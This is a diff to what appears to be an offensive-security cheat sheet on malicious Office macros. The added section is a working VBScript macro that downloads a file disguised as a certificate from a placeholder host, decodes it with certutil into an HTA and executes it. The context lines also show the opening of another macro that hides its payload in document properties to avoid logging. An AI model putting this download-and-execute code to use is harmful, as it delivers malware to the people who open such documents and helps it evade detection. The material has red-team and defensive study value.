@@ -5,6 +5,26 @@
 - ```assoc | findstr /i "excel"```
 - ```assoc | findstr /i "powerp"```
 
+### The classic download and execute macro, with a twist
+```vbscript
+Sub DownloadAndExec()
+
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://trusted.domain/encoded.crt", False
+xHttp.Send
+
+With bStrm
+    .Type = 1 '//binary
+    .Open
+    .write xHttp.responseBody
+    .savetofile "encoded.crt", 2 '//overwrite
+End With
+
+Shell ("cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta")
+
+End Sub
+```
 ### Macro leveraging file properties to hide its payload and StdIn to avoid logging 
 ```vbscript
 Public Sub PrintDocumentProperties()
